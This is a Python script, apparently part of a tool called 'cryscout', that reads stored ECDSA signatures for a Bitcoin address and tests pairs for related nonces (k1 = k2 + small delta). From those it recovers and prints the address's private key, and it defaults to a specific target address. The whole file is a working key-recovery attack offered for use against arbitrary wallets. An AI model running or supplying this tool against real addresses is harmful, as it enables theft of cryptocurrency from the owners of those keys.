import sqlite3
import collections
from lattice_nonce_analyzer import verify_key

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def scan_cross_tx_delta(address, max_sigs=200):
    conn = sqlite3.connect('cryscout.db')
    cursor = conn.cursor()
    cursor.execute('SELECT r_int, s_int, z_int, txid FROM signatures WHERE address = ? LIMIT ?', (address, max_sigs))
    rows = cursor.fetchall()
    conn.close()
    
    if len(rows) < 2:
        print(f"Not enough sigs for {address}")
        return
    
    sigs = [{'r': int(r), 's': int(s), 'z': int(z), 'txid': txid} for r, s, z, txid in rows]
    print(f"Scanning {len(sigs)} sigs for Cross-TX Delta bias for {address}...")
    
    # Check for k_i = k_j + delta
    # s1*k1 = z1 + r1*d
    # s2*k2 = z2 + r2*d
    # k1 = (z1 + r1*d)/s1
    # k2 = (z2 + r2*d)/s2
    # (z1 + r1*d)/s1 - (z2 + r2*d)/s2 = delta
    # s2*(z1 + r1*d) - s1*(z2 + r2*d) = delta * s1 * s2
    # s2*z1 + s2*r1*d - s1*z2 - s1*r2*d = delta * s1 * s2
    # d * (s2*r1 - s1*r2) = delta * s1 * s2 + s1*z2 - s2*z1
    
    for i in range(len(sigs)):
        for j in range(i + 1, len(sigs)):
            s1, s2 = sigs[i], sigs[j]
            
            # Common den
            den = (s2['s'] * s1['r'] - s1['s'] * s2['r']) % P
            if den == 0: continue
            den_inv = pow(den, -1, P)
            
            # Constant part of num
            const_num = (s1['s'] * s2['z'] - s2['s'] * s1['z']) % P
            
            # Try small deltas
            for delta in range(-100, 101):
                if delta == 0: continue
                
                num = (delta * s1['s'] * s2['s'] + const_num) % P
                d = (num * den_inv) % P
                
                if verify_key(d, address):
                    print(f"!!! SUCCESS !!! Cross-TX Nonce delta found!")
                    print(f"  k_{i} = k_{j} + {delta}")
                    print(f"  TX1: {s1['txid']}")
                    print(f"  TX2: {s2['txid']}")
                    print(f"  Private Key: {hex(d)}")
                    return True
    
    print("No Cross-TX delta found in small range.")
    return False

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "1AV4KGCsvtPZ9tG7hvwgb85wJyFd9xdpFv"
    scan_cross_tx_delta(target)
